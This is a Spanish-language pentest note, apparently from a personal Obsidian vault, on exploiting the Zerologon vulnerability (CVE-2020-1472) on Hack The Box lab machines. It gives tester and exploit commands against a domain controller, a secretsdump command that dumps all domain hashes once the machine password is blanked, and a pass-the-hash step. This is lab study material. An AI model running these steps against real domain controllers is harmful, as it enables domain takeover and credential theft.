
## DESCRIPTION

Zerologon es una vulnerabilidad en la criptografía del proceso de Netlogon de Microsoft que permite un ataque frente a los controladores de dominio de Active Directory de Microsoft. Zerologon hace que un hacker pueda suplantar cualquier ordenador, incluido el controlador del dominio raíz.

El principal uso que se le suele dar es dumpear la NTDS.DIT (base de datos con todos los hashes de todos los usuarios del dominio)

#### Mas información
* https://0xdf.gitlab.io/2020/09/17/zerologon-owning-htb-machines-with-cve-2020-1472.html
* https://0xdf.gitlab.io/2020/09/19/htb-multimaster.html

## EXPLOITATION

**!!NOTA IMPORTANTE!!** 
+ Para instalar todas las herramientas relativas a zerologon se ha usado los entornos viruales de python (see in [[PYTHON VIRTUAL ENV]]).
+ En la máquina el correspondiente a zerologon se encuentra en la ruta: `home/kali/VENV/zerologon/`
+ Para activar el entorno virtual, entrar en el directorio y usar: `source venv/bin/activate`

**!!NOTA IMPORTANTE!!** El DC-NAME de las siguientes dos herramientas es el de **NETBIOS COMPUTERNAME** (ver en crackmapexec o en big-nmap)

### OPTION 1: ONLY TESTING

* Tool repo: https://github.com/SecuraBV/CVE-2020-1472

* Path in Kali virtual env: **/home/kali/VENV/zerologon/exploit/tester/CVE-2020-1472

```
python3 zerologon_tester.py MULTIMASTER 10.10.10.179  
```

![[Pasted image 20230221190824.png]]

### OPTION 2: REAL EXPLOITING

* Tool repo: https://github.com/dirkjanm/CVE-2020-1472

* Path in Path in Kali virtual env: **/home/kali/VENV/zerologon/exploit/

```
python CVE-2020-1472/cve-2020-1472-exploit.py MULTIMASTER 10.10.10.179
```

![[Pasted image 20230221203029.png]]

Se ha cambiado la contraseña a usuario en blanco, entonces podemos usar secretdumps para volcar la base de datos de hashes del dominio.

```
secretsdump.py -no-pass -just-dc MULTIMASTER\$@10.10.10.179
```

![[Pasted image 20230221203146.png]]

Nos conectamos usando un Pass The Hash.

![[Pasted image 20230221202717.png]]

## MACHINES

* Hack The Box: Multimaster, Resolute
